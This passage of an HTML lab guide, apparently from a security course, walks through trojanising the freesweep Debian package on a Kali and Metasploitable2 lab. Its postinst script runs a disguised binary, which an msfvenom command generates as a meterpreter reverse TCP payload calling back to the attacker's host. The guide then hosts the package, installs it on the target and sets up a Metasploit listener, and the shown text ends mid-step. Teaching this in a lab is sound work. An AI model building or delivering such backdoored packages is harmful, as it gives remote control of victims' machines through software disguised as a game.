+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Add Surprise Directory</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">mkdir</span> /tmp/working/package/DEBIAN</span>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- D -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">In the DEBIAN directory, create a new file called <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>control</strong></span> with the following contents.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Create Control File</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">nano</span> /tmp/working/package/DEBIAN/control</span>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Package: freesweep</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Version: 0.88-4.3</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Section: Games and Amusement</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Priority: optional</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Architecture: i386</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;Description: a text-based minesweeper</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;&nbsp;Freesweep is an implementation of the popular minesweeper game, where</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;&nbsp; one tries to find all the mines without igniting any, based on hints given</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;&nbsp; by the computer. Unlike most implementations of this game, Freesweep</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;&nbsp; works in any visual text display - in Linux console, in an xterm, and in</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;&nbsp;most text-based terminals currently in use.</span></strong>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- E -->
+      <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">In the DEBIAN directory, create a post-installation script called <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>postinst</strong></span> with the following commands that.</span></p>
+        <ol style="list-style-type: lower-roman;" start="i">
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Change the permissions of the innocently-named "freesweep_scores" to include the execute flag.</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Run the innocently named "freesweep_scores."</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Run the legitimate freesweep program.</span></p></li>
+          <p></p>
+        </ol>
+
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;#!/bin/sh</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">&nbsp;&nbsp;sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep</span></strong>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- F -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Make this script executable.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Make Script Executable</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">chmod</span> +x /tmp/working/package/DEBIAN/postinst</span>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- G -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Now, generate our backdoor program <em>freesweep_scores</em>.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Generate Backdoor</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span> --payload linux/x86/meterpreter_reverse_tcp --arch x86 --format elf --platform linux LHOST=192.168.1.x LPORT=4575 --out /tmp/working/package/usr/games/freesweep_scores</span></strong>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- H -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Build the new <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.deb</strong></span> file with the backdoor program.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Build Package</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# -Zgzip is needed because Metasploitable2 OS is much older than Kali's, and the package manager doesn't know how to uncompress newer .deb files</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">cd</span> /tmp/working/package/DEBIAN</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">dpkg-deb</span> -Zgzip --build /tmp/working/package</span></strong><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- I -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Rename the output back into the original <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>freesweep.deb</strong></span> file name, and move it to <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>/tmp</strong></span>.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Rename Package</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">mv</span> /tmp/working/package.deb /tmp/freesweep.deb</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">cd</span> /tmp</span></strong><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- J -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Change to the <strong><em>/tmp</em></strong> directory, and start a simple web server in Kali Linux to host this <strong><em>freesweep.deb</em></strong> binary. We're using this as a way to get the binary on the target machine since we're in control of both sides, but in reality, this would be accomplished through some social engineering attack.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Hosting the Social Engineering Exploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">cd</span> /tmp</span><br /><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Built-in Webserver in Python 2</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2</span> -m SimpleHTTPServer 8888</span><br /><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Alternative Built-in Webserver in Python 3</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python3</span> -m http.server 8888</span><br /><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<!-- 4.2 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="2">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Metasploitable2 VM</em></strong>, download and run the freesweep application.</span></p>
+    <ol style="list-style-type: lower-alpha;" start="a">
+      <!-- A -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Download the <strong><em>freesweep.deb</em></strong> binary from the <strong><em>Kali Linux VM</em></strong> webserver:</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Download Exploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">wget </span> 192.168.1.x:8888/freesweep.deb</span><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- WARNING YELLOW -->
+        <blockquote>
+          <table border="0" style="border-collapse: collapse; width: 75%; background-color: #fbeeb8; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+            <tbody>
+              <tr>
+                <td style="width: 2%; background-color: #e67e23;">&nbsp;</td>
+                <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+                  <p style="margin: 0; padding: 0;"><img src="https://web.acd.ccac.edu/~mkisow/assets/yellow-warning-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="warning"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 14pt;">WARNING</span></strong></p>
+                </td>
+              </tr>
+              <tr>
+                <td style="width: 2%; background-color: #e67e23;">&nbsp;</td>
+                <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 12pt;">&#x25CF;</span></strong></td>
+                <td style="width: 93%;">
+                  <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 12pt;">If you have to re-run this wget command for any reason and leave the original file in place, the next file will be named LegitProgram.1, LegitProgram.2, etc, as shown in the wget output. Either delete the older copy prior to running wget again, or make a note of what the most recent file name is.</span></p>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <p></p>
+        </blockquote>
+      </li>
+
+      <!-- B -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Install this super fun game your friend sent you!</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Install Binary</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">dpkg </span> -i freesweep.deb</span><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<!-- 4.3 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="3">
+  <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong>, start the reverse shell for the payload you created in <em>Step 4.1</em>.</span></p>
+    <ol style="list-style-type: lower-alpha;" start="a">
+
+      <!-- A -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Start Metasploit:</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Start Metasploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">service</span> postgresql start</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfconsole</span></span><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    
+      <!-- B -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Use the generic payload handler that provides Metasploit features to exploits run outside of the framework. Configure it for the payload you just downloaded on the target VM, as it needs to know.</span></p>
+        <ol style="list-style-type: lower-roman;" start="i">
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What payload is incoming.</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What IP the payload is connecting to.</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What port the payload is connecting to.</span></p></li>
+          <p></p>
+        </ol>
+
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Start Metasploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use</span> exploit/multi/handler</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> PAYLOAD linux/x86/meterpreter_reverse_tcp</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> LHOST 192.168.1.x</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> LPORT 4575</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> ExitOnSession false</span><br />
+                  </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- C -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Run this service in the background as a job.</span></p>    
+        <!-- CODE -->
